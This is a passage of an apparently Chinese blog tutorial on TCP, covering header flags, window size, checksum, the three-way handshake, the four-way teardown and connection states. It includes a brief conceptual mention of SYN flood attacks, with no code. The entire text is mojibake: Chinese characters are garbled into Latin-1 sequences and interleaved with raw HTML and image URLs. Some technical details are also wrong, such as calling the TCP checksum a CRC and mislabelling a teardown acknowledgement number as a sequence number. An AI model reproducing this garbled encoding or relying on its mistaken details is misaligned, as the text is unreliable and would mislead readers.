æŠ¥æ–‡æ®µä¸ºã€Œç¡®è®¤æŠ¥æ–‡æ®µã€ã€‚ TCP è§„å®šï¼Œåœ¨è¿æ¥å»ºç«‹åæ‰€æœ‰ä¼ é€çš„æŠ¥æ–‡æ®µéƒ½å¿…é¡»æŠŠ ACK è®¾ç½®ä¸º 1ã€‚<br><strong>æ¨é€ PSH (Push)</strong><br>å½“ <code>PSH = 1</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºè¯¥æŠ¥æ–‡æ®µé«˜ä¼˜å…ˆçº§ï¼Œæ¥æ”¶æ–¹ TCP åº”è¯¥å°½å¿«æ¨é€ç»™æ¥æ”¶åº”ç”¨ç¨‹åºï¼Œè€Œä¸ç”¨ç­‰åˆ°æ•´ä¸ª TCP ç¼“å­˜éƒ½å¡«æ»¡äº†åå†äº¤ä»˜ã€‚<br><strong>å¤ä½ RST (Reset)</strong><br>å½“ <code>RST = 1</code> çš„æ—¶å€™ï¼Œè¡¨ç¤º TCP è¿æ¥ä¸­å‡ºç°ä¸¥é‡é”™è¯¯ï¼Œéœ€è¦é‡Šæ”¾å¹¶é‡æ–°å»ºç«‹è¿æ¥ã€‚ ä¸€èˆ¬ç§°æºå¸¦ RST æ ‡å¿—çš„ TCP æŠ¥æ–‡æ®µä¸ºã€Œå¤ä½æŠ¥æ–‡æ®µã€ã€‚<br><strong>åŒæ­¥ SYN (SYNchronization)</strong><br>å½“ <code>SYN = 1</code> çš„æ—¶å€™ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¯·æ±‚è¿æ¥æŠ¥æ–‡æ®µã€‚ ä¸€èˆ¬ç§°æºå¸¦ SYN æ ‡å¿—çš„ TCP æŠ¥æ–‡æ®µä¸ºã€ŒåŒæ­¥æŠ¥æ–‡æ®µã€ã€‚ åœ¨ TCP ä¸‰æ¬¡æ¡æ‰‹ä¸­çš„ç¬¬ä¸€ä¸ªæŠ¥æ–‡å°±æ˜¯åŒæ­¥æŠ¥æ–‡æ®µï¼Œåœ¨è¿æ¥å»ºç«‹æ—¶ç”¨æ¥åŒæ­¥åºå·ã€‚ å¯¹æ–¹è‹¥åŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™åº”åœ¨å“åº”çš„æŠ¥æ–‡æ®µä¸­ä½¿ SYN = 1 å’Œ ACK = 1ã€‚<br><strong>ç»ˆæ­¢ FIN (Finis)</strong><br>å½“ <code>FIN = 1</code> æ—¶ï¼Œè¡¨ç¤ºæ­¤æŠ¥æ–‡æ®µçš„å‘é€æ–¹çš„æ•°æ®å·²ç»å‘é€å®Œæ¯•ï¼Œå¹¶è¦æ±‚é‡Šæ”¾ TCP è¿æ¥ã€‚ ä¸€èˆ¬ç§°æºå¸¦ FIN çš„æŠ¥æ–‡æ®µä¸ºã€Œç»“æŸæŠ¥æ–‡æ®µã€ã€‚ åœ¨ TCP å››æ¬¡æŒ¥æ‰‹é‡Šæ”¾è¿æ¥çš„æ—¶å€™ï¼Œå°±ä¼šç”¨åˆ°è¯¥æ ‡å¿—ã€‚</p><h3 id="07-çª—å£å¤§å°-Window-Size"><a href="#07-çª—å£å¤§å°-Window-Size" class="headerlink" title="07. çª—å£å¤§å° Window Size"></a>07. çª—å£å¤§å° Window Size</h3><p>å  <strong>2</strong> å­—èŠ‚ã€‚ è¯¥å­—æ®µæ˜ç¡®æŒ‡å‡ºäº†ç°åœ¨å…è®¸å¯¹æ–¹å‘é€çš„æ•°æ®é‡ï¼Œå®ƒå‘Šè¯‰å¯¹æ–¹æœ¬ç«¯çš„ TCP æ¥æ”¶ç¼“å†²åŒºè¿˜èƒ½å®¹çº³å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ ·å¯¹æ–¹å°±å¯ä»¥æ§åˆ¶å‘é€æ•°æ®çš„é€Ÿåº¦ã€‚ çª—å£å¤§å°çš„å€¼æ˜¯æŒ‡ï¼Œä»æœ¬æŠ¥æ–‡æ®µé¦–éƒ¨ä¸­çš„ç¡®è®¤å·ç®—èµ·ï¼Œæ¥æ”¶æ–¹ç›®å‰å…è®¸å¯¹æ–¹å‘é€çš„æ•°æ®é‡ã€‚ ä¾‹å¦‚ï¼Œå‡å¦‚ç¡®è®¤å·æ˜¯ 701 ï¼Œçª—å£å­—æ®µæ˜¯ 1000ã€‚è¿™å°±è¡¨æ˜ï¼Œä» 701 å·ç®—èµ·ï¼Œå‘é€æ­¤æŠ¥æ–‡æ®µçš„ä¸€æ–¹è¿˜æœ‰æ¥æ”¶ 1000 ï¼ˆå­—èŠ‚åºå·æ˜¯ 701 ~ 1700ï¼‰ ä¸ªå­—èŠ‚çš„æ•°æ®çš„æ¥æ”¶ç¼“å­˜ç©ºé—´ã€‚</p><h3 id="08-æ ¡éªŒå’Œ-TCP-Checksum"><a href="#08-æ ¡éªŒå’Œ-TCP-Checksum" class="headerlink" title="08. æ ¡éªŒå’Œ TCP Checksum"></a>08. æ ¡éªŒå’Œ TCP Checksum</h3><p>å  <strong>2</strong> ä¸ªå­—èŠ‚ã€‚ ç”±å‘é€ç«¯å¡«å……ï¼Œæ¥æ”¶ç«¯å¯¹ TCP æŠ¥æ–‡æ®µæ‰§è¡Œ CRC ç®—æ³•ï¼Œä»¥æ£€éªŒ TCP æŠ¥æ–‡æ®µåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦æŸåï¼Œå¦‚æœæŸåè¿™ä¸¢å¼ƒã€‚ æ£€éªŒèŒƒå›´åŒ…æ‹¬é¦–éƒ¨å’Œæ•°æ®ä¸¤éƒ¨åˆ†ï¼Œè¿™ä¹Ÿæ˜¯ TCP å¯é ä¼ è¾“çš„ä¸€ä¸ªé‡è¦ä¿éšœã€‚</p><h3 id="09-ç´§æ€¥æŒ‡é’ˆ-Urgent-Pointer"><a href="#09-ç´§æ€¥æŒ‡é’ˆ-Urgent-Pointer" class="headerlink" title="09. ç´§æ€¥æŒ‡é’ˆ Urgent Pointer"></a>09. ç´§æ€¥æŒ‡é’ˆ Urgent Pointer</h3><p>å  <strong>2</strong>ä¸ªå­—èŠ‚ã€‚ ä»…åœ¨ URG = 1 æ—¶æ‰æœ‰æ„ä¹‰ï¼Œå®ƒæŒ‡å‡ºæœ¬æŠ¥æ–‡æ®µä¸­çš„ç´§æ€¥æ•°æ®çš„å­—èŠ‚æ•°ã€‚ å½“ URG = 1 æ—¶ï¼Œå‘é€æ–¹ TCP å°±æŠŠç´§æ€¥æ•°æ®æ’å…¥åˆ°æœ¬æŠ¥æ–‡æ®µæ•°æ®çš„<strong>æœ€å‰é¢</strong>ï¼Œè€Œåœ¨ç´§æ€¥æ•°æ®åé¢çš„æ•°æ®ä»æ˜¯æ™®é€šæ•°æ®ã€‚ å› æ­¤ï¼Œç´§æ€¥æŒ‡é’ˆæŒ‡å‡ºäº†ç´§æ€¥æ•°æ®çš„æœ«å°¾åœ¨æŠ¥æ–‡æ®µä¸­çš„ä½ç½®ã€‚</p><h2 id="ä¸‰ã€TCP-è¿æ¥çš„å»ºç«‹å’Œé‡Šæ”¾"><a href="#ä¸‰ã€TCP-è¿æ¥çš„å»ºç«‹å’Œé‡Šæ”¾" class="headerlink" title="ä¸‰ã€TCP è¿æ¥çš„å»ºç«‹å’Œé‡Šæ”¾"></a>ä¸‰ã€TCP è¿æ¥çš„å»ºç«‹å’Œé‡Šæ”¾</h2><h3 id="1-TCP-çš„è¿æ¥"><a href="#1-TCP-çš„è¿æ¥" class="headerlink" title="1. TCP çš„è¿æ¥"></a>1. TCP çš„è¿æ¥</h3><p>TCP çš„æ•´ä¸ªäº¤æµè¿‡ç¨‹å¯ä»¥æ€»ç»“ä¸ºï¼šå…ˆå»ºç«‹è¿æ¥ï¼Œç„¶åä¼ è¾“æ•°æ®ï¼Œæœ€åé‡Šæ”¾è¿æ¥ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627302229893-fd99ba2f-f93d-46b7-b9ae-b645e528f0ca.png#clientId=u30d4f1b7-5f72-4&amp;from=paste&amp;height=96&amp;id=u9589c535&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C%20%281%29.png&amp;originHeight=96&amp;originWidth=576&amp;originalType=binary%E2%88%B6=1&amp;size=10436&amp;status=done&amp;style=none&amp;taskId=ue1fb9282-8a11-4b8b-8243-b1efd24bba0&amp;width=576" alt="å®è®­äºŒ (1).png"><br>è¯¦ç»†è¿‡ç¨‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627388467966-e492a08d-ffa5-4f11-931e-88d36b5ec382.jpeg#clientId=u23b20a01-81ed-4&amp;from=drop&amp;id=u93ac234d&amp;margin=%5Bobject%20Object%5D&amp;name=image.jpeg&amp;originHeight=910&amp;originWidth=680&amp;originalType=binary%E2%88%B6=1&amp;size=66393&amp;status=done&amp;style=none&amp;taskId=u494b5401-9eb8-4b76-bafd-3977ea7e390" alt="image.jpeg"></p><h3 id="2ã€ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹è¿æ¥"><a href="#2ã€ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹è¿æ¥" class="headerlink" title="2ã€ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹è¿æ¥"></a>2ã€ä¸‰æ¬¡æ¡æ‰‹ï¼Œå»ºç«‹è¿æ¥</h3><p>TCP è¿æ¥å»ºç«‹è¦è§£å†³çš„é¦–è¦é—®é¢˜å°±æ˜¯ï¼š<strong>è¦ä½¿æ¯ä¸€æ–¹èƒ½å¤Ÿç¡®çŸ¥å¯¹æ–¹çš„å­˜åœ¨ã€‚</strong><br><strong>â€‹</strong></p><p>ä¸‰æ¬¡æ¡æ‰‹å°±åƒï¼Œåœ¨ä¸€ä¸ªé»‘æš—çš„æ£®æ—ï¼Œä½ çŸ¥é“å‰æ–¹åç‚¹é’Ÿæ–¹å‘å¥½åƒæœ‰äººã€‚<br>ä½ å–Šäº†ä¸€å¥ï¼šHelloï¼ŸIâ€™am JerryCï¼ŒWho are youï¼Ÿ<br>å¯¹é¢å›äº†ä¸€å¥ï¼šHi! Iâ€™am David, and nice to meet you!<br>ç„¶åä½ å›äº†ä¸€å¥ï¼šNice to meet you too! â€¦â€¦(è‡ªæ­¤ï¼Œä½ ä»¬æ‰ç®—çœŸæ­£è®¤è¯†äº†åŒæ–¹ï¼Œå¼€å§‹äº†åé¢çœç•¥ 3000 å­—çš„è°ˆè¯)<br>â€‹</p><p>æ‰€ä»¥è¯´ï¼Œä¸¤ä¸ªäººéœ€è¦äº¤æœ‹å‹ï¼ˆä¸¤ä¸ªç«¯ç‚¹éœ€è¦å»ºç«‹è¿æ¥ï¼‰ï¼Œè‡³å°‘éœ€è¦ä¸‰æ¬¡çš„é€šè¯ï¼ˆæ¡æ‰‹ï¼‰ã€‚<br>â€‹</p><p>å…¶å®ï¼Œç½‘ç»œä¸Šçš„ä¼ è¾“æ˜¯æ²¡æœ‰è¿æ¥çš„ï¼ŒTCP ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚<br>è€Œ TCP æ‰€è°“çš„ã€Œè¿æ¥ã€ï¼Œå…¶å®åªä¸è¿‡æ˜¯åœ¨é€šä¿¡çš„åŒæ–¹ç»´æŠ¤ä¸€ä¸ªã€Œè¿æ¥çŠ¶æ€ã€ï¼Œè®©å®ƒçœ‹ä¸Šå»å¥½åƒæœ‰è¿æ¥ä¸€æ ·ã€‚<br>â€‹</p><h4 id="è¿æ¥å»ºç«‹è¿‡ç¨‹"><a href="#è¿æ¥å»ºç«‹è¿‡ç¨‹" class="headerlink" title="è¿æ¥å»ºç«‹è¿‡ç¨‹"></a>è¿æ¥å»ºç«‹è¿‡ç¨‹</h4><p>TCP è¿æ¥çš„å»ºç«‹é‡‡ç”¨å®¢æˆ·æœåŠ¡å™¨æ–¹å¼ï¼Œä¸»åŠ¨å‘èµ·è¿æ¥å»ºç«‹çš„ä¸€æ–¹å«<strong>å®¢æˆ·ç«¯ï¼ˆClientï¼‰</strong>ï¼Œè¢«åŠ¨ç­‰å¾…è¿æ¥å»ºç«‹çš„ä¸€æ–¹å«<strong>æœåŠ¡å™¨ï¼ˆServerï¼‰</strong>ã€‚<br>â€‹</p><p>æœ€åˆçš„æ—¶å€™ï¼Œä¸¤ç«¯éƒ½å¤„äº<strong>CLOSED</strong>çš„çŠ¶æ€ï¼Œç„¶åæœåŠ¡å™¨æ‰“å¼€äº† TCP æœåŠ¡ï¼Œè¿›å…¥<strong>LISTEN</strong>çŠ¶æ€ï¼Œç›‘å¬ç‰¹å®šç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ TCP è¯·æ±‚ã€‚<br>â€‹</p><p><strong>ç¬¬ä¸€æ¬¡æ¡æ‰‹</strong>ï¼š å®¢æˆ·ç«¯ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå‘é€ TCP æŠ¥æ–‡ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼Œç„¶åè¿›å…¥ SYN_SEND çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨å‘å›ç¡®è®¤æŠ¥æ–‡ã€‚ è¿™æ—¶é¦–éƒ¨çš„åŒæ­¥ä½ SYN = 1ï¼ŒåŒæ—¶åˆå§‹åŒ–ä¸€ä¸ªåºå· Sequence Number = Jã€‚ TCP è§„å®šï¼ŒSYN æŠ¥æ–‡æ®µä¸èƒ½æºå¸¦æ•°æ®ï¼Œä½†ä¼šæ¶ˆè€—ä¸€ä¸ªåºå·ã€‚<br>â€‹</p><p><strong>ç¬¬äºŒæ¬¡æ¡æ‰‹</strong>ï¼š æœåŠ¡å™¨æ”¶åˆ°äº† SYN æŠ¥æ–‡ï¼Œå¦‚æœåŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªç¡®è®¤æŠ¥æ–‡ï¼Œç„¶åæœåŠ¡å™¨è¿›å…¥<strong>SYN_RCVD</strong> çŠ¶æ€ã€‚ è¿™æ—¶é¦–éƒ¨çš„ SYN = 1ï¼ŒACK = 1ï¼Œè€Œç¡®è®¤å· Acknowledgemt Number = J + 1ï¼ŒåŒæ—¶ä¹Ÿä¸ºè‡ªå·±åˆå§‹åŒ–ä¸€ä¸ªåºå· Sequence Number = Kã€‚ è¿™ä¸ªæŠ¥æ–‡åŒæ ·ä¸æºå¸¦æ•°æ®ã€‚<br>â€‹</p><p><strong>ç¬¬ä¸‰æ¬¡æ¡æ‰‹</strong>ï¼š å®¢æˆ·ç«¯æ”¶åˆ°äº†æœåŠ¡å™¨å‘è¿‡æ¥çš„ç¡®è®¤æŠ¥æ–‡ï¼Œè¿˜è¦å‘æœåŠ¡å™¨ç»™å‡ºç¡®è®¤ï¼Œç„¶åè¿›å…¥<strong>ESTABLISHED</strong>çŠ¶æ€ã€‚ è¿™æ—¶é¦–éƒ¨çš„ SYN ä¸å†ç½®ä¸º 1ï¼Œè€Œ ACK = 1ï¼Œç¡®è®¤å· Acknowledgemt Number = K + 1ï¼Œåºå· Sequence Number = J + 1ã€‚ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸€èˆ¬ä¼šæºå¸¦çœŸæ­£éœ€è¦ä¼ è¾“çš„æ•°æ®ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°è¯¥æ•°æ®æŠ¥æ–‡çš„æ—¶å€™ï¼Œå°±ä¼šåŒæ ·è¿›å…¥<strong>ESTABLISHED</strong>çŠ¶æ€ã€‚ æ­¤æ—¶ï¼ŒTCP è¿æ¥å·²ç»å»ºç«‹ã€‚<br>â€‹</p><p>å¯¹äºå»ºç«‹è¿æ¥çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸»è¦ç›®çš„æ˜¯åˆå§‹åŒ–åºå· Sequence Numberï¼Œå¹¶ä¸”é€šä¿¡çš„åŒæ–¹éƒ½éœ€è¦å‘ŠçŸ¥å¯¹æ–¹è‡ªå·±çš„åˆå§‹åŒ–åºå·ï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå« SYNã€‚ è¿™ä¸ªåºå·è¦ä½œä¸ºä»¥åçš„æ•°æ®é€šä¿¡çš„åºå·ï¼Œä»¥ä¿è¯åº”ç”¨å±‚æ¥æ”¶åˆ°çš„æ•°æ®ä¸ä¼šå› ä¸ºç½‘ç»œä¸Šçš„ä¼ è¾“é—®é¢˜è€Œä¹±åºï¼Œå› ä¸º TCP ä¼šç”¨è¿™ä¸ªåºå·æ¥æ‹¼æ¥æ•°æ®ã€‚<br>â€‹</p><h4 id="åˆ©ç”¨è¿æ¥è®¾è®¡ç¼ºé™·å®æ–½-TCP-Flood-æ”»å‡»"><a href="#åˆ©ç”¨è¿æ¥è®¾è®¡ç¼ºé™·å®æ–½-TCP-Flood-æ”»å‡»" class="headerlink" title="åˆ©ç”¨è¿æ¥è®¾è®¡ç¼ºé™·å®æ–½ TCP Flood æ”»å‡»"></a>åˆ©ç”¨è¿æ¥è®¾è®¡ç¼ºé™·å®æ–½ TCP Flood æ”»å‡»</h4><p>çŸ¥é“äº† TCP å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ã€‚<br>ä½†å¦‚æœä½ å¼€å§‹æ€è€ƒã€Œä¸‰æ¬¡æ¡æ‰‹çš„å¿…è¦æ€§ã€çš„æ—¶å€™ï¼Œå°±ä¼šçŸ¥é“ï¼Œå…¶å®ç½‘ç»œæ˜¯å¾ˆå¤æ‚çš„ï¼Œä¸€ä¸ªä¿¡æ¯åœ¨é€”ä¸­ä¸¢å¤±çš„å¯èƒ½æ€§æ˜¯æœ‰çš„ã€‚<br>å¦‚æœæ•°æ®ä¸¢å¤±äº†ï¼Œé‚£ä¹ˆï¼Œå°±éœ€è¦é‡æ–°å‘é€ï¼Œè¿™æ—¶å€™å°±è¦çŸ¥é“æ•°æ®æ˜¯å¦çœŸçš„é€è¾¾äº†ã€‚ è¿™å°±æ˜¯ä¸‰æ¬¡æ¡æ‰‹çš„å¿…è¦æ€§ã€‚<br>ä½†æ˜¯å†å‘æ·±ä¸€å±‚æ€è€ƒï¼Œä½ ç»™æˆ‘å‘ä¿¡æ¯ï¼Œæˆ‘æ”¶åˆ°äº†ï¼Œæˆ‘å›å¤ï¼Œå› ä¸ºæˆ‘æ˜¯å›å­ã€‚<br>å¦‚æœæ˜¯å°äººï¼Œä½ ç»™æˆ‘å‘ä¿¡æ¯ï¼Œæˆ‘å°±ç®—æ”¶åˆ°äº†ï¼Œæˆ‘ä¹Ÿä¸å›å¤ï¼Œä½ å°±ä¸€ç›´ç­‰æˆ‘ç€æˆ‘çš„å›å¤ã€‚<br>é‚£ä¹ˆå¾ˆå¤šå°äººéƒ½è¿™æ ·åšï¼Œä½ å°±è¦ä¸€ç›´è®°ä½ä½ åœ¨ç­‰å¾…ç€å°äºº 1 å·ã€å°äºº 2 å·ã€å°äºº 3 å·â€¦â€¦ç›´åˆ°ä½ çš„è„‘å®¹é‡çˆ†æ£šï¼Œçƒ§åè„‘è¢‹ã€‚<br>é»‘å®¢å°±æ˜¯åˆ©ç”¨è¿™æ ·çš„è®¾è®¡ç¼ºé™·ï¼Œå®æ–½ TCP Flood æ”»å‡»ï¼Œå±äº DDOS æ”»å‡»çš„ä¸€ç§ã€‚</p><h3 id="3ã€å››æ¬¡æŒ¥æ‰‹ï¼Œé‡Šæ”¾è¿æ¥"><a href="#3ã€å››æ¬¡æŒ¥æ‰‹ï¼Œé‡Šæ”¾è¿æ¥" class="headerlink" title="3ã€å››æ¬¡æŒ¥æ‰‹ï¼Œé‡Šæ”¾è¿æ¥"></a>3ã€å››æ¬¡æŒ¥æ‰‹ï¼Œé‡Šæ”¾è¿æ¥</h3><p>TCP æœ‰ä¸€ä¸ªç‰¹åˆ«çš„æ¦‚å¿µå«åš<strong>åŠå…³é—­</strong>ï¼Œè¿™ä¸ªæ¦‚å¿µæ˜¯è¯´ï¼ŒTCP çš„è¿æ¥æ˜¯å…¨åŒå·¥ï¼ˆå¯ä»¥åŒæ—¶å‘é€å’Œæ¥æ”¶ï¼‰çš„è¿æ¥ï¼Œå› æ­¤åœ¨å…³é—­è¿æ¥çš„æ—¶å€™ï¼Œå¿…é¡»å…³é—­ä¼ é€å’Œæ¥æ”¶ä¸¤ä¸ªæ–¹å‘ä¸Šçš„è¿æ¥ã€‚ å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªæºå¸¦ FIN çš„ TCP ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ª ç¡®è®¤æŠ¥æ–‡æ®µï¼ŒåŒæ—¶å‘é€ä¸€ä¸ª ç»“æŸæŠ¥æ–‡æ®µï¼Œå½“å®¢æˆ·ç«¯å›å¤ä¸€ä¸ª ç¡®è®¤æŠ¥æ–‡æ®µ ä¹‹åï¼Œè¿æ¥å°±ç»“æŸäº†ã€‚<br>â€‹</p><h4 id="é‡Šæ”¾è¿æ¥è¿‡ç¨‹"><a href="#é‡Šæ”¾è¿æ¥è¿‡ç¨‹" class="headerlink" title="é‡Šæ”¾è¿æ¥è¿‡ç¨‹"></a>é‡Šæ”¾è¿æ¥è¿‡ç¨‹</h4><p>åœ¨ç»“æŸä¹‹å‰ï¼Œé€šä¿¡åŒæ–¹éƒ½æ˜¯å¤„äº <strong>ESTABLISHED</strong> çŠ¶æ€ï¼Œç„¶åå…¶ä¸­ä¸€æ–¹ä¸»åŠ¨æ–­å¼€è¿æ¥ã€‚ ä¸‹é¢å‡å¦‚å®¢æˆ·ç«¯å…ˆä¸»åŠ¨æ–­å¼€è¿æ¥ã€‚<br>â€‹</p><p><strong>ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼š</strong>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åè¿›å…¥<strong>FIN_WAIT_1</strong>çŠ¶æ€ã€‚ æ­¤æŠ¥æ–‡æ®µ FIN = 1ï¼Œ Sequence Number = Mã€‚<br>â€‹</p><p><strong>ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼š</strong>æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åå‘é€ç¡®è®¤æŠ¥æ–‡æ®µï¼Œè¿›å…¥<strong>CLOSE_WAIT</strong>çŠ¶æ€ã€‚ æ­¤æŠ¥æ–‡æ®µ ACK = 1ï¼Œ Sequence Number = M + 1ã€‚<br>å®¢æˆ·ç«¯æ”¶åˆ°è¯¥æŠ¥æ–‡ï¼Œä¼šè¿›å…¥ <strong>FIN_WAIT_2</strong> çŠ¶æ€ã€‚<br>â€‹</p><p><strong>ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼š</strong>åŒæ—¶æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åè¿›å…¥<strong>LAST_ACK</strong>çŠ¶æ€ã€‚ æ­¤æŠ¥æ–‡æ®µ FIN = 1ï¼ŒSequence Number = Nã€‚<br>â€‹</p><p><strong>ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼š</strong>å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åå‘é€ç¡®è®¤æŠ¥æ–‡æ®µï¼Œè¿›å…¥<strong>TIME_WAIT</strong>çŠ¶æ€ï¼Œç»è¿‡ 2MSL ä¹‹åï¼Œè‡ªåŠ¨è¿›å…¥<strong>CLOSED</strong>çŠ¶æ€ã€‚ æ­¤æŠ¥æ–‡æ®µ ACK = 1, Sequence Number = N + 1ã€‚<br>â€‹</p><p>æœåŠ¡ç«¯æ”¶åˆ°è¯¥æŠ¥æ–‡ä¹‹åï¼Œè¿›å…¥ <strong>CLOSED</strong> çŠ¶æ€ã€‚<br>â€‹</p><p><strong>å…³äº TIME_WAIT è¿‡æ¸¡åˆ° CLOSED çŠ¶æ€è¯´æ˜</strong>ï¼š ä»<strong>TIME_WAIT</strong>è¿›å…¥<strong>CLOSED</strong>éœ€è¦ç»è¿‡ 2MSLï¼Œå…¶ä¸­ MSL å°±å«åš æœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½ï¼ˆMaxinum Segment Lifetimeï¼‰ï¼Œæ ¹æ® RFC 793 å»ºè®®è¯¥å€¼è¿™æ˜¯ä¸º 2 åˆ†é’Ÿï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦ç»è¿‡ 4 åˆ†é’Ÿï¼Œæ‰è¿›å…¥<strong>CLOSED</strong>çŠ¶æ€ã€‚</p><h2 id="å››ã€TCP-çŠ¶æ€æµè½¬"><a href="#å››ã€TCP-çŠ¶æ€æµè½¬" class="headerlink" title="å››ã€TCP çŠ¶æ€æµè½¬"></a>å››ã€TCP çŠ¶æ€æµè½¬</h2><p>æ— è®ºå®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ï¼Œåœ¨åŒæ–¹ TCP é€šè®¯çš„è¿‡ç¨‹ä¸­ï¼Œéƒ½ä¼šæœ‰ç€ä¸€ä¸ªã€ŒçŠ¶æ€ã€çš„æ¦‚å¿µï¼ŒçŠ¶æ€ä¼šéšç€ TCP é€šè®¯çš„ä¸åŒé˜¶æ®µè€Œå˜åŒ–ã€‚</p><h3 id="1-TCP-çŠ¶æ€æµè½¬å›¾"><a href="#1-TCP-çŠ¶æ€æµè½¬å›¾" class="headerlink" title="1. TCP çŠ¶æ€æµè½¬å›¾"></a>1. TCP çŠ¶æ€æµè½¬å›¾</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627388566322-c022f200-3986-45a0-b1f1-366417c5c26c.jpeg#clientId=ucabfc325-94fa-4&amp;from=drop&amp;id=u647c9220&amp;margin=%5Bobject%20Object%5D&amp;name=image%20%281%29.jpeg&amp;originHeight=812&amp;originWidth=846&amp;originalType=binary%E2%88%B6=1&amp;size=75494&amp;status=done&amp;style=none&amp;taskId=u1629fcf5-0681-4047-bb09-8dc5102ed40" alt="image (1).jpeg"></p><h3 id="2-å„ç§çŠ¶æ€è¡¨ç¤ºçš„æ„æ€"><a href="#2-å„ç§çŠ¶æ€è¡¨ç¤ºçš„æ„æ€" class="headerlink" title="2. å„ç§çŠ¶æ€è¡¨ç¤ºçš„æ„æ€"></a>2. å„ç§çŠ¶æ€è¡¨ç¤ºçš„æ„æ€</h3><p><strong>CLOSED</strong>ï¼šè¡¨ç¤ºåˆå§‹çŠ¶æ€<br><strong>LISTEN</strong>ï¼šè¡¨ç¤ºæœåŠ¡å™¨ç«¯çš„æŸä¸ª socket å¤„äºç›‘å¬çŠ¶æ€ï¼Œå¯ä»¥æ¥å—è¿æ¥<br><strong>SYN_SENT</strong>ï¼šåœ¨æœåŠ¡ç«¯ç›‘å¬åï¼Œå®¢æˆ·ç«¯ socket æ‰§è¡Œ CONNECT è¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€ SYN æŠ¥æ–‡ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å°±è¿›å…¥ SYN_SENT çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡ç«¯ç¡®è®¤ã€‚<br><strong>SYN_RCVD</strong>ï¼šè¡¨ç¤ºæœåŠ¡ç«¯æ¥æ”¶åˆ°äº† SYN æŠ¥æ–‡ã€‚<br><strong>ESTABLISHED</strong>ï¼šè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹äº†ã€‚<br><strong>FIN_WAIT_1</strong>ï¼šå…¶ä¸­ä¸€æ–¹è¯·æ±‚ç»ˆæ­¢è¿æ¥ï¼Œç­‰å¾…å¯¹æ–¹çš„ FIN æŠ¥æ–‡ã€‚<br><strong>FIN_WAIT_2</strong>ï¼šåœ¨<strong>FIN_WAIT_2</strong> ä¹‹åï¼Œ å½“å¯¹æ–¹å›åº” ACK æŠ¥æ–‡ä¹‹åï¼Œè¿›å…¥è¯¥çŠ¶æ€ã€‚<br><strong>TIME_WAIT</strong>ï¼šè¡¨ç¤ºæ”¶åˆ°äº†å¯¹æ–¹çš„ FIN æŠ¥æ–‡ï¼Œå¹¶å‘é€å‡ºäº† ACK æŠ¥æ–‡ï¼Œå°±ç­‰ 2MSL ä¹‹åå³å¯å›åˆ° CLOSED çŠ¶æ€ã€‚<br><strong>CLOSING</strong>ï¼šä¸€ç§ç½•è§çŠ¶æ€ï¼Œå‘ç”Ÿåœ¨å‘é€ FIN æŠ¥æ–‡ä¹‹åï¼Œæœ¬åº”æ˜¯å…ˆæ”¶åˆ° ACK æŠ¥æ–‡ï¼Œå´å…ˆæ”¶åˆ°å¯¹æ–¹çš„ FIN æŠ¥æ–‡ï¼Œé‚£ä¹ˆå°±ä» FIN_WAIT_1 çš„çŠ¶æ€è¿›å…¥ CLOSING çŠ¶æ€ã€‚<br><strong>CLOSE_WAIT</strong>ï¼šè¡¨ç¤ºç­‰å¾…å…³é—­ï¼Œåœ¨ ESTABLISHED è¿‡æ¸¡åˆ° LAST_ACK 